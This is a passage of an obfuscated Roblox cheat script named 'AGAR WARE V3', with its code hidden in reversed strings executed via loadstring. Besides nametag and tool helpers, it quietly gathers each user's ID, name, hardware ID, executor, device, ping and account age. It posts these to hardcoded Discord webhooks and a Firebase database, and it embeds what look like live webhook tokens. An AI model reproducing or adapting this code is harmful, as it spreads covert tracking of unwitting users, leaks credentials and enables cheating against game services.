dne nruter neht reyalPlacoL == reyalp fi	
reyalPlacoL.sreyalP = reyalPlacoL lacol	
dne nruter neht )dIresU.reyalp(detsiletihWeraWragAsI.G_ ton fi	
detsiletihWeraWragAsI.G_ litnu )(tiaw.ksat taeper	
)reyalp(gaTdetsiletihWdda noitcnuf lacol

)94 ,94 ,94(BGRmorf.3roloC = roloCekortSetihw lacol
)661 ,661 ,661(BGRmorf.3roloC = eulBkraDetihw lacol
)552 ,552 ,552(BGRmorf.3roloC = eulBthgirBetihw lacol





)gaTrenwOdda(tcennoC:deddAreyalP.sreyalP
dne )reyalp(gaTrenwOdda od ))(sreyalPteG:sreyalP(sriapi ni reyalp ,_ rof

dne
)rahCoTylppa(tcennoC:deddAretcarahC.reyalp	
dne )retcarahC.reyalp(rahCoTylppa neht retcarahC.reyalp fi	
dne	
)dne		
dne )(tcennocsiD:nnoCelacs neht nnoCelacs fi			
eslaf = gninnuReslup			
)(noitcnuf(tcennoC:gniyortseD.draobllib		
)dne		
dne			
)(tiaW:detelpmoC.thgirBot )(yalP:thgirBot				
)}eulBthgirBrenwo = 3roloCtxeT{ ,)tuOnI.noitceriDgnisaE.munE ,eniS.elytSgnisaE.munE ,2(wen.ofnIneewT ,lebal(etaerC:ecivreSneewT = thgirBot lacol				
dne kaerb neht tneraP.draobllib ton fi				
)(tiaW:detelpmoC.kraDot )(yalP:kraDot				
)}eulBkraDrenwo = 3roloCtxeT{ ,)tuOnI.noitceriDgnisaE.munE ,eniS.elytSgnisaE.munE ,2(wen.ofnIneewT ,lebal(etaerC:ecivreSneewT = kraDot lacol				
od tneraP.draobllib dna gninnuReslup elihw			
)(noitcnuf(nwaps.ksat		
eurt = gninnuReslup lacol		
)dne		
)elacs * 05 ,0 ,elacs * 002 ,0(wen.2miDU = eziS.draobllib			
2.0 + )7.0 * )tsid / 43(( = elacs lacol			
edutingaM.)noitisoP.prh - noitisoP.emarFC.mac( = tsid lacol			
dne nruter )(tcennocsiD:nnoCelacs neht tneraP.draobllib ton fi			
)(noitcnuf(tcennoC:deppetSredneR.ecivreSnuR = nnoCelacs		
nnoCelacs lacol		
aremaCtnerruC.ecapskrow = mac lacol		
0 = ycnerapsnarTekortStxeT.lebal		
roloCekortSrenwo = 3roloCekortStxeT.lebal		
eurt = delacStxeT.lebal		
edoC.tnoF.munE = tnoF.lebal		
eulBthgirBrenwo = 3roloCtxeT.lebal		
"RENWO ERAW RAGA" = txeT.lebal		
1 = ycnerapsnarTdnuorgkcaB.lebal		
)0 ,1 ,0 ,1(wen.2miDU = eziS.lebal		
)draobllib ,"lebaLtxeT"(wen.ecnatsnI = lebal lacol		
prh = tneraP.draobllib		
eslaf = nwapSnOteseR.draobllib		
eurt = poTnOsyawlA.draobllib		
)0 ,4 ,0(wen.3rotceV = tesffOsdutS.draobllib		
)05 ,0 ,002 ,0(wen.2miDU = eziS.draobllib		
"gaTeraWragA" = emaN.draobllib		
)"iuGdraoblliB"(wen.ecnatsnI = draobllib lacol		
dne nruter neht prh ton fi		
)01 ,"traPtooRdionamuH"(dlihCroFtiaW:rahc = prh lacol		
dne )(yortseD:gnitsixe neht gnitsixe fi		
)"gaTeraWragA"(dlihCtsriFdniF:rahc = gnitsixe lacol		
dne nruter neht rahc ton fi		
)rahc(rahCoTylppa noitcnuf lacol	
dne nruter neht )dIresU.reyalp(renwOeraWragAsI.G_ ton fi	
renwOeraWragAsI.G_ litnu )(tiaw.ksat taeper	
)reyalp(gaTrenwOdda noitcnuf lacol

)901 ,35 ,0(BGRmorf.3roloC = roloCekortSrenwo lacol
)661 ,38 ,0(BGRmorf.3roloC = eulBkraDrenwo lacol
)552 ,321 ,0(BGRmorf.3roloC = eulBthgirBrenwo lacol




)"ecivreSnuR"(ecivreSteG:emag = ecivreSnuR lacol
)"ecivreSneewT"(ecivreSteG:emag = ecivreSneewT lacol
)"sreyalP"(ecivreSteG:emag = sreyalP lacol]]):reverse())();
end;
task.spawn(C_461);
local function C_463()
local script = _llza[_sc(52,54,51)];
loadstring(([[dne
eurt nruter	

dne	
)(tiaw.ksat		
kcapkcaB.reyalPlacoL = tneraP.loot		
od retcarahC.reyalPlacoL == tneraP.loot elihw	

retcarahC.reyalPlacoL = tneraP.loot	

dne	
eslaf nruter		
neht loot ton fi	

)emaNloot(dlihCtsriFdniF:kcapkcaB.reyalPlacoL = loot lacol	

dne	
eslaf nruter		
neht )emaNloot(dlihCtsriFdniF:retcarahC.reyalPlacoL dna retcarahC.reyalPlacoL fi	

dne eslaf nruter neht emaNloot ton fi	
)emaNloot(noitcnuf = looThserfeR.derahs

reyalPlacoL.sreyalP = reyalPlacoL lacol
)"sreyalP"(ecivreSteG:emag = sreyalP lacol]]):reverse())();
end;
task.spawn(C_463);
local function C_465()
local script = _llza[_sc(52,54,53)];
loadstring(([[)tnuoCwen(koohbeWdnes


)tnuoCwen(tnuoCnoitucexElatoTetadpu


1 + tnuoCtnerruc = tnuoCwen lacol
)(tnuoCnoitucexElatoTteg = tnuoCtnerruc lacol


dne
)dne	
)}		
)} } debme { = sdebme {(edocnENOSJ:ecivreSpttH = ydoB			
,} "nosj/noitacilppa" = ]"epyT-tnetnoC"[ { = sredaeH			
,"TSOP" = dohteM			
,LRU_KOOHBEW = lrU			
{(qer_		

}		
)(etaDosIoT:)(won.emiTetaD = pmatsemit			
,}			
emaN.rlp_ .. " :noitucexE tsaL" = txet				
{ = retoof			
,0426432 = roloc			
,)tnuoCnoitucexe ,".semit **d%** detucexe neeb sah tpircs sihT"(tamrof.gnirts = noitpircsed			
,"3V ERAW RAGA" = eltit			
{ = debme lacol		
)(noitcnuf(llacp	
)tnuoCnoitucexe(koohbeWdnes noitcnuf lacol


dne
)dne	
)}		
)tnuoCwen(edocnENOSJ:ecivreSpttH = ydoB			
,} "nosj/noitacilppa" = ]"epyT-tnetnoC"[ { = sredaeH			
,"TUP" = dohteM			
,"nosj.tnuocnoitucexelatot/weiv/" .. LRU_ESABERIF = lrU			
{(qer_		
)(noitcnuf(llacp	
)tnuoCwen(tnuoCnoitucexElatoTetadpu noitcnuf lacol


dne
0 nruter	

dne	
dne		
tnuoc nruter			
neht "rebmun" == )tnuoc(epyt fi		
)ydoB.esnopser(edoceDNOSJ:ecivreSpttH = tnuoc lacol		
neht 002 == edoCsutatS.esnopser dna sseccus fi	

)dne	
)}		
"TEG" = dohteM			
,"nosj.tnuocnoitucexelatot/weiv/" .. LRU_ESABERIF = lrU			
{(qer_ nruter		
)(noitcnuf(llacp = esnopser ,sseccus lacol	
)(tnuoCnoitucexElatoTteg noitcnuf lacol


reyalPlacoL.sreyalP = rlp_ lacol
)tseuqer.suxulf dna suxulf( ro tseuqer_ptth ro tseuqer ro )tseuqer.nys dna nys( = qer_ lacol

"p67Nuk75Qeq9rWDm-IVeH--iCqZg2HSC-e_udWsWOsMq6yqi5gofXE3ryKdMd01q4J7Q/3716490160961244051/skoohbew/ipa/moc.drocsid//:sptth" = LRU_KOOHBEW lacol
"moc.oiesaberif.bdtr-tluafed-eraw-raga//:sptth" = LRU_ESABERIF lacol

)"sreyalP"(ecivreSteG:emag = sreyalP lacol
)"ecivreSpttH"(ecivreSteG:emag = ecivreSpttH lacol














)dne
dne	
)dne		
)}			
"ETELED" = dohteM				
,"nosj." .. emaN.rlp_ .. "/sresu_enilno/" .. LRU_ESABERIF_ = lrU				
{(qer_			
)(noitcnuf(llacp		
neht rlp_ == reyalp fi	
)reyalp(noitcnuf(tcennoC:gnivomeRreyalP.)"sreyalP"(ecivreSteG:emag


)dne
dne	
)(sutatSenilnOetadpu		
od )081(tiaw elihw	
)(noitcnuf(nwaps


)(sutatSenilnOetadpu


dne
)dne	
)}		
)}			
)(emit.so = taebtraeh_tsal				
,dIecalP.emag = di_ecalp				
,)(kniLnioj_ = knil_emag				
,emaN.ofnItcudorp_ = eman_emag				
,)(diwh_ = diwh				
,emaNyalpsiD.rlp_ .. " / " .. emaN.rlp_ = yalpsid_emanresu				
{(edocnENOSJ:ecivreSpttH_ = ydoB			
,} "nosj/noitacilppa" = ]"epyT-tnetnoC"[ { = sredaeH			
,"TUP" = dohteM			
,"nosj." .. emaN.rlp_ .. "/sresu_enilno/" .. LRU_ESABERIF_ = lrU			
{(qer_		
)(noitcnuf(llacp	
)(sutatSenilnOetadpu noitcnuf lacol

} "nwonknU" = emaN { ro )dIecalP.emag(ofnItcudorPteG:cvSecalptekraM_ dna )dne
)dIecalP.emag(ofnItcudorPteG:cvSecalptekraM_ nruter	
)(noitcnuf(llacp = ofnItcudorp_ lacol

dne
"" ro v dna ko nruter	
)dne	
dIboJ.emag .. "=dIecnatsnIemag&" ..			
dIecalP.emag ..			
"=dIecalp?trats/semag/moc.xolbor.www//:sptth" nruter		
)(noitcnuf(llacp = v ,ko lacol	
)(kniLnioj_ noitcnuf lacol

dne
"A/N" ro di dna ko nruter	
)dne )(dItneilCteG:)"ecivreSscitylanAxbR"(ecivreSteG:emag nruter )(noitcnuf(llacp = di ,ko lacol	
dne ))(diwh_teg(gnirtsot nruter neht diwh_teg fi	
)(diwh_ noitcnuf lacol

)tseuqer.suxulf dna suxulf( ro tseuqer_ptth ro tseuqer ro )tseuqer.nys dna nys( = qer_ lacol

)"ecivreSecalptekraM"(ecivreSteG:emag = cvSecalptekraM_ lacol
)"ecivreSpttH"(ecivreSteG:emag = ecivreSpttH_ lacol
reyalPlacoL.)"sreyalP"(ecivreSteG:emag = rlp_ lacol
"moc.oiesaberif.bdtr-tluafed-eraw-raga//:sptth" = LRU_ESABERIF_ lacol


















dne
)}	
)(etaDosIoT:)(won.emiTetaD = pmatsemit		
,} EMAN_TPIRCS_ = txet { = retoof		
,000000x0 = roloc		
,)		
tnuoc_noitucexe.ataDreyalp			
,diwh			
,)(spf_			
,)(gnip_			
,)(mroftalp_			
,)(rotucexe_			
,sreyalPxaM.sreyalP_			
,)(sreyalPteG:sreyalP_#			
,)(kniLnioj_			
,emaN.ofnItcudorp_			
,egAtnuoccA.rlp_			
,detaerCtnuocca			
,dIresU.rlp_			
,"d%# **:tnuoC noitucexE**n\n\`s%` **:DIWH**n\spfd% | smd% | s% **:eciveD**n\s% **:rotucexE**n\n\d%/d% **:revreS**n\)s%(]s%[ **:emaG**n\n\)syaD d%( **s%**n\`d%`# **:DI resU**"			
(tamrof.gnirts = noitpircsed		
,)emaN.rlp_ ,emaNyalpsiD.rlp_ ,"s%@ / s%"(tamrof.gnirts = eltit		
{(dnes_	

))00468 * egAtnuoccA.rlp_( - )(emit.so ,"d%-m%-Y%"(etad.so = detaerCtnuocca lacol	

)}	
nees_tsal.ataDreyalp = nees_tsal		
,tnuoc_noitucexe.ataDreyalp = tnuoc_noitucexe		
{ ,yeKtnerruc(ataDreyalPetadpu_	

)(emit.so = nees_tsal.ataDreyalp	
1 + tnuoc_noitucexe.ataDreyalp = tnuoc_noitucexe.ataDreyalp	
	

)diwh ,yeKtnerruc(DIWHdda_ = ataDreyalp lacol	
	

dne	
)yeKtnerruc ,yeKgnitsixe(yeKreyalPemaner_		
		
neht yeKtnerruc =~ yeKgnitsixe dna yeKgnitsixe fi	

)dIresu(yeKreyalPdnif_ = yeKgnitsixe lacol	
	

emanresu .. " - " .. dIresu = yeKtnerruc lacol	
	

)(diwh_ = diwh lacol	
emaN.rlp_ = emanresu lacol	
dIresU.rlp_ = dIresu lacol	

dne	
)dne		
)}			
)} } elbaTdebme { = sdebme {(edocnENOSJ:ecivreSpttH_ =   ydoB				
,} "nosj/noitacilppa" = ]"epyT-tnetnoC"[ { = sredaeH				
,"TSOP" = dohteM				
,KOOHBEW_ =    lrU				
{(qer_			
)(noitcnuf(llacp		
)elbaTdebme(dnes_ noitcnuf lacol	

dne	
ataDreyalp nruter		

dne		
)} sdiwh.ataDreyalp = sdiwh { ,yeKreyalp(ataDreyalPetadpu_			
)diwh ,sdiwh.ataDreyalp(tresni.elbat			
neht stsixEdiwh ton fi		
		

dne		
dne			
kaerb				
eurt = stsixEdiwh				
neht diwh == diwHgnitsixe fi			
od )sdiwh.ataDreyalp(sriap ni diwHgnitsixe ,_ rof		
eslaf = stsixEdiwh lacol		
		

)yeKreyalp(ataDreyalPteg_ = ataDreyalp lacol		
)diwh ,yeKreyalp(DIWHdda_ noitcnuf lacol	

dne	
)dne		
)}			
)atad(edocnENOSJ:ecivreSpttH_ = ydoB				
,} "nosj/noitacilppa" = ]"epyT-tnetnoC"[ { = sredaeH				
,"HCTAP" = dohteM				
,"nosj." .. )yeKreyalp(edocnElrU:ecivreSpttH_ .. "/sreyalp/" .. LRU_ESABERIF_ = lrU				
{(qer_			
)(noitcnuf(llacp		
)atad ,yeKreyalp(ataDreyalPetadpu_ noitcnuf lacol	

dne	
}		
}{ = sdiwh			
,)(emit.so = nees_tsal			
,)(emit.so = nees_tsrif			
,0 = tnuoc_noitucexe			
{ nruter		

dne		
dne			
atad nruter				
neht "elbat" == )atad(epyt fi			
)ydoB.esnopser(edoceDNOSJ:ecivreSpttH_ = atad lacol			
neht 002 == edoCsutatS.esnopser dna sseccus fi		

)dne		
)}			
"TEG" = dohteM				
,"nosj." .. )yeKreyalp(edocnElrU:ecivreSpttH_ .. "/sreyalp/" .. LRU_ESABERIF_ = lrU				
{(qer_ nruter			
)(noitcnuf(llacp = esnopser ,sseccus lacol		
)yeKreyalp(ataDreyalPteg_ noitcnuf lacol	

dne	
dne		
)dne			
)}				
"ETELED" = dohteM					
,"nosj." .. )yeKdlo(edocnElrU:ecivreSpttH_ .. "/sreyalp/" .. LRU_ESABERIF_ = lrU					
{(qer_				
)(noitcnuf(llacp			
			

)dne			
)}				
)atad(edocnENOSJ:ecivreSpttH_ = ydoB					
,} "nosj/noitacilppa" = ]"epyT-tnetnoC"[ { = sredaeH					
,"TUP" = dohteM					
,"nosj." .. )yeKwen(edocnElrU:ecivreSpttH_ .. "/sreyalp/" .. LRU_ESABERIF_ = lrU					
{(qer_				
)(noitcnuf(llacp			
			

)ydoB.esnopser(edoceDNOSJ:ecivreSpttH_ = atad lacol			
neht 002 == edoCsutatS.esnopser dna sseccus fi		

)dne		
)}			
"TEG" = dohteM				
,"nosj." .. )yeKdlo(edocnElrU:ecivreSpttH_ .. "/sreyalp/" .. LRU_ESABERIF_ = lrU				
{(qer_ nruter			
)(noitcnuf(llacp = esnopser ,sseccus lacol		
		
)yeKwen ,yeKdlo(yeKreyalPemaner_ noitcnuf lacol	

dne	
lin nruter		

dne		
dne			
dne				
dne					
yek nruter						
neht dIresu == )dIresUyek(rebmunot dna dIresUyek fi					
)"-%*s%)+d%(^"(hctam:yek = dIresUyek lacol					
					
od )sreyalPlla(sriap ni _ ,yek rof				
neht "elbat" == )sreyalPlla(epyt fi			
)ydoB.esnopser(edoceDNOSJ:ecivreSpttH_ = sreyalPlla lacol			
neht 002 == edoCsutatS.esnopser dna sseccus fi		

)dne		
)}			
"TEG" = dohteM				
,"nosj.sreyalp/" .. LRU_ESABERIF_ = lrU				
{(qer_ nruter			
)(noitcnuf(llacp = esnopser ,sseccus lacol		
		
)dIresu(yeKreyalPdnif_ noitcnuf lacol	

dne	
"" ro v dna ko nruter		
)dne		
dIboJ.emag .. "=dIecnatsnIemag&" ..				
dIecalP.emag ..				
"=dIecalp?trats/semag/moc.xolbor.www//:sptth" nruter			
)(noitcnuf(llacp = v ,ko lacol		
)(kniLnioj_ noitcnuf lacol	

dne	
0 ro )v(roolf.htam dna 0 > v nruter		
)(SPFscisyhPlaeRteG:ecapskrow = v lacol		
)(spf_ noitcnuf lacol	

dne	
0 ro )v(roolf.htam dna ko nruter		
)dne		
)(eulaVteG:]"gniP ataD"[metIstatSrevreS.krowteN.)"statS"(ecivreSteG:emag nruter			
)(noitcnuf(llacp = v ,ko lacol		
)(gnip_ noitcnuf lacol	

dne	
ecived nruter		

dne p = ecived esle		
"xobX" = ecived neht "PWU" == p fiesle		
"diordnA" = ecived neht "diordnA" == p fiesle		
"SOi" = ecived neht "SOI" == p fiesle		
"SOcaM" = ecived neht "XSO" == p fiesle		
"swodniW" = ecived neht "swodniW" == p fi		

"nwonknU" = ecived lacol		
emaN.)(mroftalPteG:ecivreStupnI_ = p lacol		
)(mroftalp_ noitcnuf lacol	

dne	
"nwonknU" nruter		
dne )(emanrotucexeteg nruter neht emanrotucexeteg fi		
dne "LNRK" nruter neht lnrK ro DEDAOL_LNRK fi		
dne "suxulF" nruter neht tseuqer.suxulf dna suxulf fi		
dne "X espanyS" nruter neht tseuqer.nys dna nys fi		
)(rotucexe_ noitcnuf lacol	

dne	
"A/N" ro di dna ko nruter		
)dne )(dItneilCteG:cvSscitylanA_ nruter )(noitcnuf(llacp = di ,ko lacol		
dne ))(diwh_teg(gnirtsot nruter neht diwh_teg fi		
)(diwh_ noitcnuf lacol	

} "nwonknU" = emaN { ro )dIecalP.emag(ofnItcudorPteG:cvSecalptekraM_ dna )dne	
)dIecalP.emag(ofnItcudorPteG:cvSecalptekraM_ nruter		
)(noitcnuf(llacp = ofnItcudorp_ lacol	
reyalPlacoL.sreyalP_ = rlp_ lacol	

dne } 0 = edoCsutatS { nruter )(noitcnuf ro		
)tseuqer.suxulf dna suxulf( ro		
tseuqer_ptth ro		
tseuqer ro		
)tseuqer.nys dna nys( = qer_ lacol	

"3V ERAW RAGA" = EMAN_TPIRCS_ lacol	
"moc.oiesaberif.bdtr-tluafed-eraw-raga//:sptth" = LRU_ESABERIF_ lacol	
"Y5OjMWPfGRGZdgqQKnKm2LR00YCTCm7xKjqMJTSDX1BIvIzWfN3VOZUyv6aebsjJ7vam/8520572096370592051/skoohbew/ipa/moc.drocsid//:sptth" = KOOHBEW_ lacol	

)"ecivreStupnIresU"(ecivreSteG:emag =    ecivreStupnI_ lacol	
)"ecivreSscitylanAxbR"(ecivreSteG:emag =    cvSscitylanA_ lacol	
)"ecivreSecalptekraM"(ecivreSteG:emag =  cvSecalptekraM_ lacol	
)"sreyalP"(ecivreSteG:emag =         sreyalP_ lacol	
)"ecivreSpttH"(ecivreSteG:emag =     ecivreSpttH_ lacol	
od
}{ = HW_ lacol]]):reverse())();
end;
task.spawn(C_465);

return _llza[_sc(49)], require;
